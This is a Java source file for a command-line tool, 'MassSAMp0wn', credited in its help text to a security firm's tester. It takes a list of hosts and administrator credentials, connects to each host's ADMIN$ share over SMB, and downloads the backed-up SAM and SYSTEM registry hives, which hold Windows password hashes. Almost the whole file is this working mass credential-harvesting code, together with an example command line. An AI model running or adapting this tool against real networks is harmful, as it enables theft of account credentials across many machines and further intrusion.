package massSSgrabAlpha;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.util.HashMap;
import java.util.Properties;
import java.util.Vector;
import java.util.logging.Level;
import java.util.logging.Logger;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbException;
import jcifs.smb.SmbFile;

/**
 *
 * @author op7ica
 */
public class MassSAMp0wn
{

    private static Vector hosts;

    /**
     * Check the version of current OS
     *
     * @return version
     */
    private static String checkOSVersion()
    {
        Properties sProp = java.lang.System.getProperties();
        String sVersion = sProp.getProperty("os.name");
        return String.valueOf(sVersion);
    }

    /**
     * Check the version of current java
     *
     * @return version
     */
    private static String checkVersion()
    {
        Properties sProp = java.lang.System.getProperties();
        String sVersion = sProp.getProperty("java.version");
        return String.valueOf(sVersion.charAt(2));
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args)
    {
        // Step 1 - parse command line arguments
        HashMap argum = new HashMap();
        int i = 0;
        String arg;
        boolean verbose;
        while (i < args.length && args[i].startsWith("-"))
        {
            // Prase commands for our use and add them to HashMap
            arg = args[i++];
            if (arg.equals("--verbose"))
            {
                System.out.println("[+] Verbose mode ON");
                argum.put("Verbose", true);
            } else if (arg.contains("="))
            {
                try
                {
                    String argName = arg.split("=")[0];
                    String argValue = arg.split("=")[1];
                    // add all of the arguments to our HashMap
                    argum.put(argName, argValue);
                } catch (Exception e)
                {
                    System.out.println("[-] Error parsing arguments! Please use correct arguments!");
                    return;
                }
            } else if (arg.equals("--help"))
            {
                System.out.println("A large scale SAM + System grabber from /repair/ v0.1");
                System.out.println("Written by Yuri Kramarz of Portcullis Security");
                System.out.println();
                System.out.println("The following options can be used: ");
                System.out.println();
                System.out.println("--help - Display this help ");
                System.out.println("--verbose - Be verbose");
                System.out.println("--h - Host List (IP's in text file)");
                System.out.println("--u - Username");
                System.out.println("--p - Password");
                System.out.println("--d - Domain");
                System.out.println("--o - Output Directory");
                System.out.println("--sam - name of the SAM file (default sam)");
                System.out.println("--system - name of the SYSTEM file (default system)");
                System.out.println("Example command line: ");
                System.out.println("java -jar MassSSDump.jar --h=/tmp/ip_list.txt --u=Administrator --p=Password1 --d=WORKSTATION --o=/tmp/test --verbose --sam=sam --system=system");
            }
        } // end of argument while loop
        if (args.length < 1)
        {
            System.out.println("A large scale SAM + System grabber from /repair/ v0.1");
            System.out.println("Written by Yuri Kramarz of Portcullis Security");
            System.out.println();
            System.out.println("The following options can be used: ");
            System.out.println();
            System.out.println("--help - Display this help ");
            System.out.println("--verbose - Be verbose");
            System.out.println("--h - Host List (IP's in text file)");
            System.out.println("--u - Username");
            System.out.println("--p - Password");
            System.out.println("--d - Domain");
            System.out.println("--o - Output Directory");
            System.out.println("--sam - name of the SAM file (default sam)");
            System.out.println("--system - name of the SYSTEM file (default system)");
            System.out.println("Example command line: ");
            System.out.println("java -jar MassSSDump.jar --h=/tmp/ip_list.txt --u=Administrator --p=Password1 --d=WORKSTATION --o=/tmp/test --verbose --sam=sam --system=system");
            return;
        }

        // Step 2 - parse host config to vector
        if (argum.containsKey("--h"))
        {
            hosts = new ReadConfig(argum.get("--h").toString()).getQueries();
            for (int k = 0; k < hosts.size(); k++)
            {
                if (argum.get("Verbose") != null)
                {
                    if (hosts.get(k) != null)
                    {
                        System.out.println("\t[+]Will grab SAM/System from : " + hosts.get(k).toString());
                    }
                }
            }
        } else
        {
            System.out.println("[!] Missing host file");
            return;
        }
        for (int z = 0; z < hosts.size() - 1; z++)
        {
            if (argum.get("Verbose") != null)
            {
                if (hosts.get(z) != null)
                {
                    System.out.println("\t[+]Running mass SAM/System grab agains : " + hosts.get(z).toString());
                }
            }
            try
            {
                String sharedFolder = "ADMIN$";


                NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(argum.get("--d").toString(),
                        argum.get("--u").toString(),
                        argum.get("--p").toString());

                if (argum.get("--sam") == null || argum.get("--system") == null)
                {
                    System.err.println("\t\t [!]Specify sam/system file name! Exit ..... ");
                    return;
                }

                
                String SAMlocation = "smb://" + hosts.get(z).toString() + "/" + sharedFolder + "/repair/" + argum.get("--sam").toString();
                SmbFile SAMFile = new SmbFile(SAMlocation, auth);
                String SystemLocation = "smb://" + hosts.get(z).toString() + "/" + sharedFolder + "/repair/" + argum.get("--system").toString();
                SmbFile SystemFile = new SmbFile(SystemLocation, auth);


                Thread.currentThread().sleep(1000);
                // just silly print out b
                if (argum.get("Verbose") != null)
                {
                    System.out.println("\t\t[+] " + hosts.get(z).toString() + " : ");
                    if (SAMFile.exists())
                    {
                        System.out.println("\t\t\t[+] SAM file exists");
                    }
                    if (SystemFile.exists())
                    {
                        System.out.println("\t\t\t[+] System file exists");
                    }
                }
                // if SAM exists copy it out to us
                if (SAMFile.exists() && SystemFile.exists())
                {
                    // check if we are on win or linux for output
                    if (checkOSVersion().toLowerCase().contains("win"))
                    {
                        String outDir = argum.get("--o").toString() + "\\" + hosts.get(z).toString();
                        //create directory to store stuff in
                        File host_dir = new File(outDir);
                        host_dir.mkdir();
                        // nasty bits :) could wrap it in nice function
                        OutputStream SAM_save = new FileOutputStream(outDir + "\\SAM_dump");
                        InputStream isSAM = SAMFile.getInputStream();
                        byte[] SAM_fileresult = new byte[(int) SAMFile.length()];
                        int totalBytesRead = 0;
                        while (totalBytesRead < SAM_fileresult.length)
                        {
                            int bytesRemaining = SAM_fileresult.length - totalBytesRead;
                            //input.read() returns -1, 0, or more :
                            int bytesRead = isSAM.read(SAM_fileresult, totalBytesRead, bytesRemaining);
                            if (bytesRead > 0)
                            {
                                totalBytesRead = totalBytesRead + bytesRead;
                            }
                        }
                        SAM_save.write(SAM_fileresult);
                        SAM_save.close();
                        isSAM.close();
                        SAM_fileresult = null;
                        if (argum.get("Verbose") != null)
                        {
                            System.out.println("\t\t\t[+] SAM file saved in " + outDir + "\\SAM_dump");
                        }
                        OutputStream System_save = new FileOutputStream(outDir + "\\System_dump");
                        InputStream isSystem = SystemFile.getInputStream();
                        byte[] System_fileresult = new byte[(int) SystemFile.length()];
                        int totalBytesReadA = 0;
                        while (totalBytesReadA < System_fileresult.length)
                        {
                            int bytesRemainingA = System_fileresult.length - totalBytesReadA;
                            //input.read() returns -1, 0, or more :
                            int bytesReadA = isSystem.read(System_fileresult, totalBytesReadA, bytesRemainingA);
                            if (bytesReadA > 0)
                            {
                                totalBytesReadA = totalBytesReadA + bytesReadA;
                            }
                        }
                        if (argum.get("Verbose") != null)
                        {
                            System.out.println("\t\t\t[+] System file saved in " + outDir + "\\System_dump");
                        }
                        System_save.write(System_fileresult);
                        System_save.close();
                        isSystem.close();
                        System_fileresult = null;
                        SAMFile = null;
                        SystemFile = null;
                    } else
                    {
                        String outDir = argum.get("--o").toString() + "/" + hosts.get(z).toString();
                        //create directory to store stuff in
                        File host_dir = new File(outDir);
                        host_dir.mkdir();
                        // nasty bits :) could wrap it in nice function
                        OutputStream SAM_save = new FileOutputStream(outDir + "/SAM_dump");
                        InputStream isSAM = SAMFile.getInputStream();
                        byte[] SAM_fileresult = new byte[(int) SAMFile.length()];
                        int totalBytesRead = 0;
                        while (totalBytesRead < SAM_fileresult.length)
                        {
                            int bytesRemaining = SAM_fileresult.length - totalBytesRead;
                            //input.read() returns -1, 0, or more :
                            int bytesRead = isSAM.read(SAM_fileresult, totalBytesRead, bytesRemaining);
                            if (bytesRead > 0)
                            {
                                totalBytesRead = totalBytesRead + bytesRead;
                            }
                        }
                        SAM_save.write(SAM_fileresult);
                        SAM_save.close();
                        isSAM.close();
                        SAM_fileresult = null;
                        if (argum.get("Verbose") != null)
                        {
                            System.out.println("\t\t\t[+] SAM file saved in " + outDir + "/SAM_dump");
                        }
                        OutputStream System_save = new FileOutputStream(outDir + "/System_dump");
                        InputStream isSystem = SystemFile.getInputStream();
                        byte[] System_fileresult = new byte[(int) SystemFile.length()];
                        int totalBytesReadA = 0;
                        while (totalBytesReadA < System_fileresult.length)
                        {
                            int bytesRemainingA = System_fileresult.length - totalBytesReadA;
                            //input.read() returns -1, 0, or more :
                            int bytesReadA = isSystem.read(System_fileresult, totalBytesReadA, bytesRemainingA);
                            if (bytesReadA > 0)
                            {
                                totalBytesReadA = totalBytesReadA + bytesReadA;
                            }
                        }
                        if (argum.get("Verbose") != null)
                        {
                            System.out.println("\t\t\t[+] System file saved in " + outDir + "/System_dump");
                        }
                        System_save.write(System_fileresult);
                        System_save.close();
                        isSystem.close();
                        System_fileresult = null;
                        SAMFile = null;
                        SystemFile = null;
                    }
                } else
                {
                    System.out.println("\t\t\t[!] Sam/System combination do not exists. Try different names (--sam and --system params)");

                }

            } catch (MalformedURLException ex)
            {
                Logger.getLogger(MassSAMp0wn.class.getName()).log(Level.SEVERE, null, ex);
            } catch (SmbException ex)
            {
                System.out.println("\t\t\tIP: " + hosts.get(z).toString() + " SMB timeout or your credentials are wrong ! Moving on .. ");
            } catch (FileNotFoundException ex)
            {
                Logger.getLogger(MassSAMp0wn.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex)
            {
                Logger.getLogger(MassSAMp0wn.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex)
            {
                Logger.getLogger(MassSAMp0wn.class.getName()).log(Level.SEVERE, null, ex);
            }

        } // EOF host loop
    } // EOF main
} // EOF class
